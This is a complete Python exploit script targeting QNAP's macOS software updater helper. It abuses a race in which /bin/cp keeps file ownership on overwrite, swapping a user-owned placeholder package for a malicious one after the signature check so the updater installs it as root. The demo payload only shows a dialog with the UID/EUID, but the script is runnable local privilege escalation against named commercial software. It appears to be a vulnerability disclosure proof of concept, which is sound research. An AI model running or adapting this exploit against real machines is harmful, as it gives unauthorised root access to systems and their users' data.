"""
qnap_updater_exploit.py: Abuse '/bin/cp' file ownership inheritance on overwrite.

----------
Logic:
- During 'com.qnap.qsoftwareupdater' package updates, it copies the new package next to the DMG.
- If an existing file is there, '/bin/cp' will overwrite but keep the file ownership.
- Thus place an empty pkg owned by the user, let QNAP copy over it, then replace it with a malicious pkg.
- Then QNAP will install the PKG, allowing for local privilege escalation.

----------
Usage:
$ pip3 install requests macos-pkg-builder
$ python3 qnap_updater_exploit.py

Ensure 'QNAPQVPNMac-2.2.3.0126.dmg' is in the current directory.
- https://www.qnap.com/en/utilities/networking
- https://download.qnap.com/Storage/Utility/QNAPQVPNMac-2.2.3.0126.dmg
"""


import tempfile
import requests
import threading
import subprocess
import macos_pkg_builder

from pathlib import Path


class QNAPUpdaterExploit:

    def __init__(self) -> None:
        self._valid_pkg_name     = "QVPN.pkg"
        self._valid_dmg_path     = "QNAPQVPNMac-2.2.3.0126.dmg" # Any DMG with a QNAP-signed package will work
        self._endpoint_url       = "http://127.0.0.1:5349/QSoftwareUpdater/"
        self._malicious_pkg_name = "QVPN-Malware.pkg"

        self._malicious_pkg_payload = """#!/bin/zsh\n/usr/bin/osascript -e "display dialog \\"Hello from malware!\n\nCurrent user: $(/usr/bin/whoami)\nUID:  $UID\nEUID: $EUID\\"" """


    def _endpoint_version(self) -> str:
        """
        QSoftwareUpdater/Version returns 'com.qnap.qsoftwareupdater' embedded version.

        ex. '1.0.1.0721'
        """
        return requests.get(self._endpoint_url + "Version").text


    def _endpoint_update_pkg(self, dmg_path: str = None, pkg_name = None) -> None:
        """
        QSoftwareUpdater/UpdatePKG will install a DMG embedded in a provided PKG.

        Internal logic:
        1. Detach DMG: 'hdiutil detach -f /Volumes/{dmg_path's name}' (always done even if not mounted)
        2. Attach DMG: 'hdiutil attach {dmg_path}'
        3. Search for PKGs on DMG
        4. Grab first PKG, checks signature: 'pkgutil --check-signature {pkg_path}'
        5. Copies PKG to next to DMG: '/bin/cp {pkg_path} .'
        6. Set 'SilentInstalling=1' environment variable: '/bin/launchctl setenv SilentInstalling 1'
        7. Creates lock file: '/usr/bin/touch /tmp/com.qnap.qsoftwareupdater.lock'
        8. Installs PKG: 'installer -pkg {pkg_path} -target / -dumplog'
        """

        url = self._endpoint_url + f"UpdatePKG?path={Path(dmg_path).resolve()}"
        if pkg_name:
            url += f"&pkgName={pkg_name}"

        result = requests.get(url)
        if "fail," in result.text:
            print("Failed to update package")
            print(result.text)


    def _generate_pkg(self) -> None:
        """
        Generates a malicious PKG with a preinstall script that displays a dialog box.
        """

        preinstall_script = tempfile.NamedTemporaryFile(delete=False)
        preinstall_script.write(self._malicious_pkg_payload.encode())
        preinstall_script.close()

        assert macos_pkg_builder.Packages(
            pkg_output=self._malicious_pkg_name,
            pkg_bundle_id="com.malware.qvpn",
            pkg_preinstall_script=preinstall_script.name,
        ).build() is True


    def _generate_empty_pkg(self) -> None:
        """
        Generates an empty PKG owned by the user.
        """
        subprocess.run(["/usr/bin/touch", self._valid_pkg_name])


    def run(self) -> None:
        """
        Run the exploit.
        """
        print("Starting QNAP Updater Exploit")

        if not Path(self._valid_dmg_path).exists():
            print(f"Valid DMG not found: {self._valid_dmg_path}")
            print("Please provide a valid DMG path")

        print("Testing connection to the endpoint")
        print(f"Version: {self._endpoint_version()}")

        print("Generating empty PKG")
        self._generate_empty_pkg()

        print("Generating malicious PKG")
        self._generate_pkg()

        print("Sending payload")
        threading.Thread(target=self._endpoint_update_pkg, args=(self._valid_dmg_path,)).start()

        # Wait for QNAP to copy over the PKG
        while "/bin/cp" not in subprocess.run(["/bin/ps", "-ax"], capture_output=True).stdout.decode():
            pass
        while "/bin/cp" in subprocess.run(["/bin/ps", "-ax"], capture_output=True).stdout.decode():
            pass

        print("Swapping PKGs")
        subprocess.run(["/bin/rm", self._valid_pkg_name])
        subprocess.run(["/usr/bin/ditto", self._malicious_pkg_name, self._valid_pkg_name])

        print("Done")


if __name__ == "__main__":
    QNAPUpdaterExploit().run()
